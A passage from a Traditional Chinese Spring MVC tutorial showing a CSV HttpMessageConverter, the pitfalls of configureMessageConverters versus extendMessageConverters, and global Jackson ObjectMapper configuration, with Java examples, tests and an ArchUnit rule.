import org.springframework.core.ResolvableType;
import org.springframework.http.HttpInputMessage;
import org.springframework.http.HttpOutputMessage;
import org.springframework.http.MediaType;
import org.springframework.http.converter.AbstractGenericHttpMessageConverter;
import org.springframework.http.converter.HttpMessageNotReadableException;
import org.springframework.http.converter.HttpMessageNotWritableException;

import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.Writer;
import java.lang.reflect.ParameterizedType;
import java.lang.reflect.Type;
import java.nio.charset.StandardCharsets;
import java.util.Collection;

/**
 * 把 {@code Collection<T>} 寫成 CSV。
 *
 * <p>★ 只支援「寫」不支援「讀」——
 * CSV 的解析（引號、跳脫、編碼偵測）遠比看起來複雜，
 * 而我們的匯入端點（05 章練習 2）需要逐列的錯誤回報，
 * 那不是 {@code HttpMessageConverter} 能表達的。
 * <b>「只做一半」在這裡是正確的設計。</b>
 *
 * <p>★ 為什麼繼承 {@code AbstractGenericHttpMessageConverter}：
 * 只有它能拿到泛型資訊（{@code Collection<OrderSummary>} 而不只是 {@code Collection}）——
 * 而我們需要知道 {@code T} 才能決定欄位。
 *
 * <p>⚠️ 記憶體行為：這個 converter <b>逐筆</b>寫出，
 * 所以「CSV 字串」不佔記憶體。
 * 但呼叫端傳進來的 {@code Collection} 本身還是全部在記憶體裡 ——
 * <b>所以它只適合小資料量</b>（05 章 5.9.1 的方式 ②）。
 * 大量匯出仍然要用 {@code StreamingResponseBody}。
 */
public class CsvHttpMessageConverter extends AbstractGenericHttpMessageConverter<Object> {

    public static final MediaType TEXT_CSV = new MediaType("text", "csv",
                                                           StandardCharsets.UTF_8);

    /** UTF-8 BOM —— Excel（Windows）需要它才不會把中文顯示成亂碼（05 章 5.9.2）。 */
    private static final char UTF8_BOM = '\uFEFF';

    private final CsvRowMapperRegistry registry;

    public CsvHttpMessageConverter(CsvRowMapperRegistry registry) {
        super(TEXT_CSV);
        this.registry = registry;
    }

    /**
     * 判斷能不能寫。
     *
     * <p>⚠️ 三個檢查都必要：
     * <ol>
     *   <li>是 {@code Collection} 的子型別。</li>
     *   <li>拿得到元素型別（不是原始型別 {@code Collection}）。</li>
     *   <li><b>那個元素型別有註冊的 mapper</b> —— 這一條讓
     *       「回傳 {@code List<String>} 的端點」不會意外被當成 CSV 處理。</li>
     * </ol>
     */
    @Override
    public boolean canWrite(Type type, Class<?> contextClass, MediaType mediaType) {
        if (!canWrite(mediaType)) return false;
        Class<?> elementType = elementTypeOf(type);
        return elementType != null && registry.hasMapper(elementType);
    }

    @Override
    protected boolean supports(Class<?> clazz) {
        return Collection.class.isAssignableFrom(clazz);
    }

    /** ★ 明確不支援讀取。 */
    @Override
    public boolean canRead(Type type, Class<?> contextClass, MediaType mediaType) {
        return false;
    }

    @Override
    protected Object readInternal(Class<?> clazz, HttpInputMessage inputMessage) {
        throw new HttpMessageNotReadableException(
                "CSV 不支援作為請求格式，請使用 POST /order-import-jobs", inputMessage);
    }

    @Override
    public Object read(Type type, Class<?> contextClass, HttpInputMessage inputMessage) {
        throw new HttpMessageNotReadableException(
                "CSV 不支援作為請求格式，請使用 POST /order-import-jobs", inputMessage);
    }

    @Override
    protected void writeInternal(Object body, Type type, HttpOutputMessage outputMessage)
            throws IOException, HttpMessageNotWritableException {

        if (!(body instanceof Collection<?> collection)) {
            throw new HttpMessageNotWritableException(
                    "CsvHttpMessageConverter 只支援 Collection，收到 "
                    + body.getClass().getName());
        }

        Class<?> elementType = elementTypeOf(type);
        CsvRowMapper<Object> mapper = registry.require(elementType);

        // ⚠️ 一定要用 outputMessage.getBody()（而不是自己開流），
        //    而且【不要】關閉它 —— Spring 會處理。
        //    關掉它會讓後續的 filter（例如 04 章的回應包裝）拿不到流。
        Writer writer = new OutputStreamWriter(outputMessage.getBody(), StandardCharsets.UTF_8);

        writer.write(UTF8_BOM);
        writer.write(CsvWriter.header(mapper.headers()));

        int written = 0;
        for (Object element : collection) {
            writer.write(CsvWriter.row(mapper.values(element)));
            // ★ 每 500 筆 flush，避免 Writer 的內部緩衝無限成長
            if (++written % 500 == 0) {
                writer.flush();
            }
        }
        writer.flush();
        // ★ 刻意不 close()
    }

    /**
     * 從 {@code Collection<OrderSummary>} 取出 {@code OrderSummary}。
     *
     * @return 元素型別，或 {@code null}（拿不到泛型資訊）
     */
    private static Class<?> elementTypeOf(Type type) {
        if (type instanceof ParameterizedType parameterized) {
            Type[] args = parameterized.getActualTypeArguments();
            if (args.length == 1 && args[0] instanceof Class<?> clazz) {
                return clazz;
            }
        }
        // ★ 也支援 ResolvableType（Spring 對 ResponseEntity<List<T>> 的解析）
        ResolvableType resolvable = ResolvableType.forType(type);
        if (Collection.class.isAssignableFrom(resolvable.toClass())) {
            Class<?> generic = resolvable.asCollection().getGeneric(0).resolve();
            return generic;
        }
        return null;
    }
}
```

```java
package example.shop.common.web.converter;

/**
 * 「某個型別怎麼變成 CSV 的一列」。
 *
 * <p>★ 為什麼用一個明確的介面而不是反射（讀所有欄位）：
 * <ol>
 *   <li><b>欄位順序</b>：反射拿到的順序不保證穩定（依 JVM 實作），
 *       而 CSV 的欄位順序是<b>對外契約</b>（營運的 Excel 公式會依欄位位置）。</li>
 *   <li><b>欄位名稱</b>：CSV 的標題要是中文（給營運看），
 *       而 DTO 的欄位名是英文。</li>
 *   <li><b>選擇性</b>：DTO 可能有不該進 CSV 的欄位
 *       （巢狀物件、內部欄位）。反射會全部帶進去。</li>
 * </ol>
 *
 * <p>⚠️ 代價：每個要支援 CSV 的型別都要寫一個 mapper。
 * <b>這個代價是刻意接受的</b> —— 它讓「CSV 的欄位」變成一個
 * 需要 code review 的明確決定。
 */
public interface CsvRowMapper<T> {

    /** 這個 mapper 負責哪個型別。 */
    Class<T> supportedType();

    /** CSV 的標題列（中文，給營運看）。 */
    String[] headers();

    /** 一列的值。⚠️ 長度必須與 {@link #headers()} 相同。 */
    Object[] values(T element);
}
```

```java
package example.shop.order.web.csv;

import example.shop.common.web.converter.CsvRowMapper;
import example.shop.order.web.dto.OrderSummary;
import org.springframework.stereotype.Component;

/** {@link OrderSummary} 的 CSV 對映。 */
@Component
public class OrderSummaryCsvRowMapper implements CsvRowMapper<OrderSummary> {

    /**
     * ★ 欄位清單是一個【對外契約】。
     *
     * <p>⚠️ 改動規則（和 API 的相容性規則一樣，03-rest-api 第 06 章）：
     * <ul>
     *   <li>在<b>最後</b>加欄位 = 相容（Excel 公式不受影響）。</li>
     *   <li>改欄位順序 = <b>破壞性</b>（營運的 VLOOKUP 會取到錯的欄）。</li>
     *   <li>改欄位名稱 = 破壞性（如果有人用標題比對）。</li>
     *   <li>移除欄位 = 破壞性。</li>
     * </ul>
     * 這一段註解的存在是為了讓改動它的人知道那不是「只是改個字串」。
     */
    private static final String[] HEADERS = {
            "訂單編號", "客戶編號", "客戶名稱", "狀態", "狀態說明",
            "商品數", "小計", "運費", "折扣", "總金額", "幣別",
            "付款方式", "建立時間（UTC）", "付款時間（UTC）"
    };

    @Override
    public Class<OrderSummary> supportedType() {
        return OrderSummary.class;
    }

    @Override
    public String[] headers() {
        return HEADERS.clone();          // ★ 防禦性複製（陣列是可變的）
    }

    @Override
    public Object[] values(OrderSummary o) {
        return new Object[]{
                o.orderId(),
                o.customerId(),
                o.customerName(),
                o.status(),
                o.statusLabel(),         // ★ 03-rest-api 3.10.2 的 statusLabel
                o.itemCount(),
                o.amounts().subtotal(),  // ★ 已經是 String（金額用字串，6.5.7）
                o.amounts().shippingFee(),
                o.amounts().discount(),
                o.amounts().total(),
                o.currency(),
                o.paymentMethod(),
                o.createdAt(),
                o.paidAt()
        };
    }
}
```

```java
package example.shop.common.web.converter;

import org.springframework.stereotype.Component;

import java.util.List;
import java.util.Map;
import java.util.function.Function;
import java.util.stream.Collectors;

/**
 * 所有 {@link CsvRowMapper} 的登錄簿。
 *
 * <p>★ 用建構子注入 {@code List<CsvRowMapper<?>>} 讓 Spring 自動收集所有實作 ——
 * 新增一個 mapper 只要加 {@code @Component}，不用改這個類別。
 */
@Component
public class CsvRowMapperRegistry {

    private final Map<Class<?>, CsvRowMapper<?>> byType;

    public CsvRowMapperRegistry(List<CsvRowMapper<?>> mappers) {
        this.byType = mappers.stream().collect(Collectors.toMap(
                CsvRowMapper::supportedType,
                Function.identity(),
                (a, b) -> {
                    // ★ 兩個 mapper 對應同一個型別 → 啟動失敗
                    //   （靜默挑一個會造成「CSV 的欄位偶然改變」）
                    throw new IllegalStateException(
                            "型別 %s 有兩個 CsvRowMapper：%s 與 %s"
                                    .formatted(a.supportedType().getName(),
                                               a.getClass().getName(),
                                               b.getClass().getName()));
                }));
    }

    public boolean hasMapper(Class<?> type) {
        return type != null && byType.containsKey(type);
    }

    @SuppressWarnings("unchecked")
    public <T> CsvRowMapper<T> require(Class<?> type) {
        CsvRowMapper<?> mapper = byType.get(type);
        if (mapper == null) {
            throw new IllegalStateException("沒有 CsvRowMapper 支援型別 " + type);
        }
        return (CsvRowMapper<T>) mapper;
    }
}
```

**現在 Controller 可以這樣寫**：

```java
    /**
     * 小量的 CSV 匯出（≤ 2000 筆）。
     *
     * <p>★ 對照 05 章 5.9.2 的串流版：
     * <table>
     *   <tr><th></th><th>這個版本</th><th>StreamingResponseBody 版</th></tr>
     *   <tr><td>Controller 行數</td><td>5</td><td>約 60</td></tr>
     *   <tr><td>記憶體</td><td>O(筆數)</td><td>O(1)</td></tr>
     *   <tr><td>錯誤處理</td><td>✅ 完整（走 advice）</td><td>⚠️ 部分失效（5.9.4）</td></tr>
     *   <tr><td>上限</td><td>2,000 筆</td><td>20,000 筆</td></tr>
     * </table>
     *
     * <p>⚠️ 所以 shop-service <b>兩個都保留</b>：
     * 這一支給「訂單詳情頁的匯出按鈕」（一次幾十筆），
     * 串流版給「營運的月報表」。
     */
    @GetMapping(value = "/orders/{orderId}/items.csv", produces = "text/csv")
    public ResponseEntity<List<OrderItemRow>> exportItems(
            @PathVariable("orderId") String orderId,
            @CurrentActor Actor actor) {

        var items = orderService.getItems(orderId, actor);

        HttpHeaders headers = new HttpHeaders();
        ContentDispositions.apply(headers, false, "訂單明細-%s.csv".formatted(orderId));
        headers.setCacheControl(CacheControl.noStore());

        return new ResponseEntity<>(mapper.toItemRows(items), headers, HttpStatus.OK);
    }
```

### 6.4.5 `configureMessageConverters` vs `extendMessageConverters` ★★

**這是 Spring MVC 最容易造成「莫名其妙壞掉」的一對方法。**

```java
public interface WebMvcConfigurer {

    /**
     * ⚠️ 實作這個方法會【完全取代】Spring 的預設 converter 清單。
     */
    default void configureMessageConverters(List<HttpMessageConverter<?>> converters) {}

    /**
     * ✅ 在預設清單【之後】被呼叫，可以增刪改。
     */
    default void extendMessageConverters(List<HttpMessageConverter<?>> converters) {}
}
```

**Spring 的預設 converter 清單**（`WebMvcConfigurationSupport.addDefaultHttpMessageConverters`）：

```
ByteArrayHttpMessageConverter
StringHttpMessageConverter
ResourceHttpMessageConverter
ResourceRegionHttpMessageConverter          ★★ 05 章 5.8.3 的 Range 支援靠它
AllEncompassingFormHttpMessageConverter
MappingJackson2HttpMessageConverter         （Jackson 在 classpath 上時）
（可能還有 XML、Smile、CBOR、Protobuf… 依 classpath）
```

**如果你寫了 `configureMessageConverters`**：

```java
    // 🔴🔴 這段程式碼會造成三個災難
    @Override
    public void configureMessageConverters(List<HttpMessageConverter<?>> converters) {
        converters.add(new MappingJackson2HttpMessageConverter(objectMapper));
        converters.add(new CsvHttpMessageConverter(registry));
    }
```

| 災難 | 症狀 |
|---|---|
| 1. **`ResourceRegionHttpMessageConverter` 不見了** | 🔴 **05 章 5.8.3 的 `Range` 支援全部失效**。`GET` 帶 `Range` 會回 200 + 完整內容（而不是 206），或直接 406 |
| 2. **`ResourceHttpMessageConverter` 不見了** | 🔴 所有回傳 `Resource` 的端點（檔案下載）回 406 |
| 3. **`StringHttpMessageConverter` 不見了** | 🔴 回傳 `String` 的端點壞掉（包括某些 Actuator 端點） |

⚠️ **災難 1 特別惡毒**，因為它**不會報錯**：
`Range` 請求只是被忽略，回傳完整內容。
下載一個 500 MB 的檔案時「續傳」失效 —— 而測試如果沒測 Range 就完全看不出來。

**正確做法**：

```java
package example.shop.common.config;

import com.fasterxml.jackson.databind.ObjectMapper;
import example.shop.common.web.converter.CsvHttpMessageConverter;
import example.shop.common.web.converter.CsvRowMapperRegistry;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.MediaType;
import org.springframework.http.converter.HttpMessageConverter;
import org.springframework.http.converter.ResourceRegionHttpMessageConverter;
import org.springframework.http.converter.json.MappingJackson2HttpMessageConverter;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

import java.util.List;

/**
 * `HttpMessageConverter` 的設定。
 *
 * <p>★★ 一定要用 {@code extendMessageConverters}，
 * <b>絕不能用 {@code configureMessageConverters}</b>（6.4.5）——
 * 後者會弄掉 {@code ResourceRegionHttpMessageConverter}，
 * 也就是弄掉 05 章 5.8.3 的 {@code Range} 支援。
 */
@Configuration
public class MessageConverterConfig implements WebMvcConfigurer {

    private static final Logger log = LoggerFactory.getLogger(MessageConverterConfig.class);

    private final ObjectMapper objectMapper;
    private final CsvRowMapperRegistry csvRegistry;

    public MessageConverterConfig(ObjectMapper objectMapper,
                                  CsvRowMapperRegistry csvRegistry) {
        this.objectMapper = objectMapper;
        this.csvRegistry = csvRegistry;
    }

    @Override
    public void extendMessageConverters(List<HttpMessageConverter<?>> converters) {

        // ── ① 確保 Jackson 用【我們的】ObjectMapper ──────────────
        // ⚠️ Boot 的自動組態通常已經做了這件事，
        //    但如果有人 new 了一個 MappingJackson2HttpMessageConverter，
        //    它會用自己的 ObjectMapper（6.5.2 的問題）。
        for (HttpMessageConverter<?> converter : converters) {
            if (converter instanceof MappingJackson2HttpMessageConverter jackson) {
                if (jackson.getObjectMapper() != objectMapper) {
                    log.warn("發現使用不同 ObjectMapper 的 Jackson converter，已替換");
                    jackson.setObjectMapper(objectMapper);
                }
                jackson.setSupportedMediaTypes(List.of(
                        MediaType.APPLICATION_JSON,
                        MediaType.valueOf("application/merge-patch+json"),
                        MediaType.valueOf("application/problem+json"),
                        MediaType.valueOf("application/x-ndjson")));   // 05 章 5.9.4
            }
        }

        // ── ② 加入 CSV converter ────────────────────────────────
        // ★ 插在【最前面】：
        //   Spring 依清單順序找第一個 canWrite 的 converter。
        //   如果 Jackson 在前面，而某個端點的 produces 是 text/csv，
        //   Jackson 會回 false（它不支援 text/csv），所以順序其實不重要。
        //   ⚠️ 但如果有人不小心讓 Jackson 支援 text/csv（設 supportedMediaTypes），
        //      順序就會決定結果。放前面是防禦性的。
        converters.add(0, new CsvHttpMessageConverter(csvRegistry));

        // ── ③ 驗證關鍵的預設 converter 還在 ★★ ──────────────────
        assertPresent(converters, ResourceRegionHttpMessageConverter.class,
                "Range 請求支援（05 章 5.8.3）會失效");
        assertPresent(converters,
                org.springframework.http.converter.ResourceHttpMessageConverter.class,
                "檔案下載端點會回 406");
        assertPresent(converters,
                org.springframework.http.converter.StringHttpMessageConverter.class,
                "回傳 String 的端點會壞掉");

        log.info("HttpMessageConverter 清單（依序）：{}",
                 converters.stream().map(c -> c.getClass().getSimpleName()).toList());
    }

    /**
     * ★ 這個檢查是這個類別最有價值的部分。
     *
     * <p>它守住的是「有人把 {@code extendMessageConverters} 改成
     * {@code configureMessageConverters}」這個改動 ——
     * 那個改動看起來只是「換一個方法名」，實際上會弄掉三個關鍵 converter，
     * 而且症狀（Range 失效）不會有任何錯誤訊息。
     */
    private static void assertPresent(List<HttpMessageConverter<?>> converters,
                                      Class<?> required, String consequence) {
        boolean present = converters.stream().anyMatch(required::isInstance);
        if (!present) {
            throw new IllegalStateException(
                    "缺少 %s —— %s。".formatted(required.getSimpleName(), consequence)
                    + "最可能的原因是有人用了 configureMessageConverters 而不是 "
                    + "extendMessageConverters（06 章 6.4.5）。");
        }
    }
}
```

⚠️ **`assertPresent` 讓「換一個方法名」變成啟動失敗**，
而錯誤訊息直接指出原因與章節。
這比一句註解有效得多 —— 註解會被忽略，啟動失敗不會。

**一個守住 Range 支援的測試**：

```java
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
class RangeSupportRegressionTest {

    @Autowired TestRestTemplate rest;

    @Test
    @DisplayName("★ Range 請求回 206 —— 守住 ResourceRegionHttpMessageConverter")
    void range() {
        var headers = new HttpHeaders();
        headers.set("Range", "bytes=0-99");
        headers.setBearerAuth(testToken("cus_1"));

        var response = rest.exchange("/orders/ord_1/receipts/rcp_1",
                HttpMethod.GET, new HttpEntity<>(headers), byte[].class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.PARTIAL_CONTENT);
        assertThat(response.getBody()).hasSize(100);
        assertThat(response.getHeaders().getFirst("Content-Range"))
                .startsWith("bytes 0-99/");
    }

    @Test
    @DisplayName("★ Accept-Ranges 標頭存在 —— 它是 Spring 自動加的，可以當偵測器")
    void acceptRanges() {
        var headers = new HttpHeaders();
        headers.setBearerAuth(testToken("cus_1"));

        var response = rest.exchange("/orders/ord_1/receipts/rcp_1",
                HttpMethod.GET, new HttpEntity<>(headers), byte[].class);

        // ★ 這個標頭只有在 Spring 認出「回傳型別是 Resource」時才會加，
        //   所以它是「Resource 的處理鏈完整」的一個廉價指標
        assertThat(response.getHeaders().getFirst("Accept-Ranges")).isEqualTo("bytes");
    }
}
```

### 6.4.6 媒體型別版本：為什麼 shop-service 不用

**做法**：把版本放進 `Accept`。

```http
GET /orders/ord_1
Accept: application/vnd.shop.order+json;version=2
```

```java
    @GetMapping(value = "/orders/{orderId}",
                produces = "application/vnd.shop.order+json;version=1")
    public OrderDetailV1 getV1(...) { }

    @GetMapping(value = "/orders/{orderId}",
                produces = "application/vnd.shop.order+json;version=2")
    public OrderDetailV2 getV2(...) { }
```

| 優點 | 缺點 |
|---|---|
| ✅ URL 保持穩定（同一個資源永遠是同一個 URL —— 更符合 REST） | 🔴 **無法在瀏覽器位址欄測試** |
| ✅ 可以逐個資源獨立版本 | 🔴 **無法貼 URL 給同事** |
| ✅ 不會有 `/v1/` `/v2/` 的路徑重複 | 🔴 curl 每次都要打長長的 `-H` |
| | 🔴 **CDN / 快取要 `Vary: Accept`** → 命中率下降 |
| | 🔴 逐個資源版本 = 客戶端要記 19 個資源各自的版本 |
| | 🔴 OpenAPI 的工具支援較差 |

**shop-service 用路徑版本（`/v1/orders`）** —— 03-rest-api 第 06 章的決定。

⚠️ **但有一個地方媒體型別很有用：同一個資源的不同「表述」而非「版本」。**

```http
GET /orders/ord_1
Accept: application/json                          → 完整的訂單
Accept: application/vnd.shop.order-label+pdf      → 出貨標籤 PDF
Accept: text/csv                                  → 明細 CSV
```

**這不是版本，是「同一個資源的不同格式」** —— 那正是內容協商的本意。

**shop-service 的選擇還是用路徑**（`/orders/ord_1/label.pdf`），理由與 6.4.3 相同：
URL 要能貼、要能在瀏覽器開、錯誤訊息要能指路。

> **一個誠實的評價**：
> 「媒體型別版本」在理論上更優雅，在實務上讓每一次除錯都變麻煩。
> 如果你的 API 只被程式呼叫（B2B、內部服務），它是合理的選擇。
> 如果有人會用瀏覽器或 curl 直接看，路徑版本的實務成本低得多。

---

## 6.5 Jackson 全域設定

### 6.5.1 `ObjectMapper` 從哪裡來

**Spring Boot 的組裝過程**（`JacksonAutoConfiguration`）：

```
① 建立一個 Jackson2ObjectMapperBuilder
     └── Spring Framework 的預設調整：
           MapperFeature.DEFAULT_VIEW_INCLUSION            = false
           DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES = false
     └── Boot 的預設調整：
           SerializationFeature.WRITE_DATES_AS_TIMESTAMPS  = false

② 套用 spring.jackson.* 設定（JacksonProperties）
     spring.jackson.property-naming-strategy
     spring.jackson.default-property-inclusion
     spring.jackson.serialization.*
     spring.jackson.deserialization.*
     spring.jackson.mapper.*
     spring.jackson.parser.*
     spring.jackson.generator.*
     spring.jackson.time-zone
     spring.jackson.locale
     spring.jackson.date-format

③ 註冊所有 classpath 上找得到的 Module（ServiceLoader）
     JavaTimeModule                （jackson-datatype-jsr310）
     Jdk8Module                    （jackson-datatype-jdk8：Optional 支援）
     ParameterNamesModule          （建構子參數名，record 綁定用）
     JsonNullableModule            （如果有加 openapi-jackson-databind-nullable）
     Hibernate6Module              （如果有加 jackson-datatype-hibernate）

④ 套用所有 Jackson2ObjectMapperBuilderCustomizer bean
     ★ 這是【你】應該介入的地方（6.5.3）

⑤ builder.build() → 唯一的 ObjectMapper bean

⑥ 把它交給 MappingJackson2HttpMessageConverter
```

**驗證你的實際設定**（一個很有用的診斷端點）：

```java
package example.shop.common.web;

import com.fasterxml.jackson.databind.DeserializationFeature;
import com.fasterxml.jackson.databind.MapperFeature;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;
import org.springframework.boot.autoconfigure.condition.ConditionalOnProperty;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

import java.util.LinkedHashMap;
import java.util.Map;
import java.util.TreeMap;

/**
 * 印出實際生效的 Jackson 設定。
 *
 * <p>★ 為什麼值得做：{@code spring.jackson.*} 的設定與
 * {@code Jackson2ObjectMapperBuilderCustomizer} 的疊加順序不直觀，
 * 而「我以為設定生效了但其實沒有」是很常見的情況。
 * <b>直接問 ObjectMapper 比讀文件可靠。</b>
 *
 * <p>⚠️ 這個端點只在 local / dev 開啟（它會洩漏內部設定）。
 */
@RestController
@ConditionalOnProperty(name = "api.diagnostics.enabled", havingValue = "true")
public class JacksonDiagnosticsController {

    private final ObjectMapper objectMapper;

    public JacksonDiagnosticsController(ObjectMapper objectMapper) {
        this.objectMapper = objectMapper;
    }

    @GetMapping("/diagnostics/jackson")
    public Map<String, Object> config() {
        Map<String, Object> result = new LinkedHashMap<>();

        result.put("objectMapperClass", objectMapper.getClass().getName());
        result.put("registeredModules", objectMapper.getRegisteredModuleIds());
        result.put("propertyNamingStrategy", String.valueOf(
                objectMapper.getSerializationConfig().getPropertyNamingStrategy()));
        result.put("serializationInclusion", String.valueOf(
                objectMapper.getSerializationConfig()
                        .getDefaultPropertyInclusion().getValueInclusion()));
        result.put("timeZone", objectMapper.getSerializationConfig()
                .getTimeZone().getID());

        Map<String, Boolean> serialization = new TreeMap<>();
        for (SerializationFeature f : SerializationFeature.values()) {
            serialization.put(f.name(), objectMapper.isEnabled(f));
        }
        result.put("serialization", serialization);

        Map<String, Boolean> deserialization = new TreeMap<>();
        for (DeserializationFeature f : DeserializationFeature.values()) {
            deserialization.put(f.name(), objectMapper.isEnabled(f));
        }
        result.put("deserialization", deserialization);

        Map<String, Boolean> mapper = new TreeMap<>();
        for (MapperFeature f : MapperFeature.values()) {
            mapper.put(f.name(), objectMapper.isEnabled(f));
        }
        result.put("mapper", mapper);

        // ★ 06 章 6.7.3 的安全上限
        var constraints = objectMapper.getFactory().streamReadConstraints();
        result.put("streamReadConstraints", Map.of(
                "maxNestingDepth", constraints.getMaxNestingDepth(),
                "maxStringLength", constraints.getMaxStringLength(),
                "maxNumberLength", constraints.getMaxNumberLength(),
                "maxNameLength", constraints.getMaxNameLength(),
                "maxDocumentLength", constraints.getMaxDocumentLength()));

        return result;
    }
}
```

⚠️ **`getRegisteredModuleIds()` 是最有用的一項**：
它能立刻回答「`JavaTimeModule` 真的註冊了嗎」——
而那個問題的錯誤答案會讓 `Instant` 序列化成一個巨大的物件
（`{"seconds":1756000462,"nanos":0}`）而不是 ISO-8601 字串。

### 6.5.2 為什麼永遠不要 `new ObjectMapper()` ★

```java
    // 🔴 在任何 Spring 專案裡都不該出現這一行
    private static final ObjectMapper MAPPER = new ObjectMapper();
```

**一個 `new ObjectMapper()` 缺少 6.5.1 的第 ②③④ 步**，也就是缺少：

| 缺少的東西 | 具體後果 |
|---|---|
| `JavaTimeModule` | 🔴 `Instant` 序列化成 `{"seconds":...,"nanos":...}`，或直接拋 `InvalidDefinitionException: Java 8 date/time type not supported by default` |
| `WRITE_DATES_AS_TIMESTAMPS = false` | 🔴 `Instant` 變成 `1756000462.000000000` |
| `default-property-inclusion: non_null` | 🔴 回應多出一堆 `"field": null` |
| `FAIL_ON_UNKNOWN_PROPERTIES` 的設定 | ⚠️ 行為與主 mapper 不一致 |
| `ParameterNamesModule` | ⚠️ 非 record 的建構子綁定失效 |
| `StreamReadConstraints`（6.7.3） | 🔴 **JSON 深度炸彈的防護消失** |
| 自訂的 serializer（6.6） | 🔴 金額變成 JSON number 而不是字串 |

**而最糟的是：這些不一致只出現在「用到那個 mapper 的地方」。**

**shop-service 裡誰會用到 `ObjectMapper`？**

```
① MappingJackson2HttpMessageConverter        （Spring 注入的，✅ 沒問題）
② ProblemWriter                              （03 章 3.10.1 —— 注入的 ✅）
③ BodyMasker                                 （04 章 4.6.4 —— ⚠️ 檢查一下）
④ SseRedisBridge                             （05 章 5.11.6 —— ⚠️ 檢查一下）
⑤ IdempotencyStore                           （04 章 4.9.3 —— 存回應快照）
⑥ 05 章的 NDJSON 串流                        （5.9.4）
⑦ 測試裡的斷言
```

⚠️ **④ 特別危險**：`SseRedisBridge` 用一個 `new ObjectMapper()` 的話，
SSE 推播的 `Instant` 會變成 `{"seconds":...}`，
**而同一筆資料透過 `GET /orders/{id}` 拿到的是 ISO-8601 字串** ——
前端的解析邏輯要處理兩種格式，而且沒有人知道為什麼。

⚠️ **⑤ 更危險**：冪等回應快照用不同的 mapper 序列化，
重播（04 章 4.9.5）時回給客戶端的 JSON 格式與第一次不同
→ **「重試同一個請求得到不同格式的回應」**。

**一個放進 CI 的 ArchUnit 規則**：

```java
package example.shop.arch;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.tngtech.archunit.core.domain.JavaClass;
import com.tngtech.archunit.core.domain.JavaConstructorCall;
import com.tngtech.archunit.junit.AnalyzeClasses;
import com.tngtech.archunit.junit.ArchTest;
import com.tngtech.archunit.lang.ArchCondition;
import com.tngtech.archunit.lang.ArchRule;
import com.tngtech.archunit.lang.ConditionEvents;
import com.tngtech.archunit.lang.SimpleConditionEvent;

import static com.tngtech.archunit.lang.syntax.ArchRuleDefinition.noClasses;

/**
 * 「不可以 new ObjectMapper()」的架構規則。
 *
 * <p>★ 這條規則守住的是 6.5.2 的整組問題。
 * 它的價值在於：那些問題的症狀（時間格式不一致、金額格式不一致）
 * <b>看起來像是「前端的 bug」</b>，會浪費很多人的時間。
 */
@AnalyzeClasses(packages = "example.shop",
                importOptions = com.tngtech.archunit.core.importer
                        .ImportOption.DoNotIncludeTests.class)
class ObjectMapperUsageTest {

    @ArchTest
    static final ArchRule 不可自己建立ObjectMapper = noClasses()
            .should(new ArchCondition<JavaClass>("呼叫 new ObjectMapper()") {
                @Override
                public void check(JavaClass clazz, ConditionEvents events) {
                    for (JavaConstructorCall call : clazz.getConstructorCallsFromSelf()) {
                        String target = call.getTargetOwner().getName();
                        if (target.equals(ObjectMapper.class.getName())
                                || target.equals("com.fasterxml.jackson.databind.json.JsonMapper")
                                || target.equals("com.fasterxml.jackson.dataformat.xml.XmlMapper")) {
                            events.add(SimpleConditionEvent.violated(clazz,
                                    """
                                    %s 自己建立了 %s。
                                    請改為注入 Spring 管理的 ObjectMapper bean。
                                    理由見 06 章 6.5.2：自建的 mapper 缺少 JavaTimeModule、
                                    金額的自訂 serializer 與 StreamReadConstraints，
                                    會造成「同一筆資料在不同端點格式不同」。
                                    如果你真的需要一個不同設定的 mapper，
                                    請用 objectMapper.copy() 並在 6.9 的清單裡登記。
                                    """.formatted(call.getOriginOwner().getName(), target)));
                        }
                    }
                }
            })
            .because("6.5.2：自建的 ObjectMapper 會造成格式不一致");
}
```

⚠️ **規則的訊息裡給了「合法的出路」（`objectMapper.copy()`）** ——
沒有出路的規則會被人用 `@ArchIgnore` 繞過。

**真的需要不同設定時，用 `copy()`**：

```java
package example.shop.common.config;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

/**
 * 有兩個 mapper 的正確做法。
 *
 * <p>⚠️ shop-service 只有一個地方需要不同設定：
 * <b>寫入稽核紀錄與冪等快照時要「格式穩定」</b>——
 * 那些 JSON 會被存幾年，而主 mapper 的設定（例如
 * {@code default-property-inclusion}）未來可能會改。
 * 如果存進去的格式跟著改，舊資料與新資料就不一致了。
 */
@Configuration
public class SecondaryObjectMapperConfig {

    /**
     * 給「持久化」用的 mapper。
     *
     * <p>★ 三個刻意的差異：
     * <ol>
     *   <li>{@code ALWAYS} 而不是 {@code NON_NULL}：
     *       存下來的 JSON 要有完整的欄位清單，
     *       日後才能判斷「這個欄位當時是 null」還是「當時還沒有這個欄位」。</li>
     *   <li>{@code ORDER_MAP_ENTRIES_BY_KEYS}：讓輸出可 diff、可比對。</li>
     *   <li><b>不</b>使用金額的自訂 serializer（6.6.1）：
     *       稽核紀錄要存「原始的 BigDecimal」而不是格式化後的字串。</li>
     * </ol>
     *
     * <p>⚠️ 名稱裡明確寫 "persistence" —— 讓注入時不會拿錯。
     */
    @Bean("persistenceObjectMapper")
    public ObjectMapper persistenceObjectMapper(ObjectMapper primary) {
        // ★ copy() 保留所有 module 與 StreamReadConstraints，只改我們要改的
        ObjectMapper copy = primary.copy();
        copy.setSerializationInclusion(
                com.fasterxml.jackson.annotation.JsonInclude.Include.ALWAYS);
        copy.enable(SerializationFeature.ORDER_MAP_ENTRIES_BY_KEYS);
        return copy;
    }
}
```

⚠️ **`copy()` 有一個效能成本**：它會複製整個設定與快取。
**只能在啟動時做一次**（放進 `@Bean`），
絕不能在每個請求裡 `objectMapper.copy()`（那會讓序列化的快取失效）。

### 6.5.3 shop-service 的完整 Jackson 設定
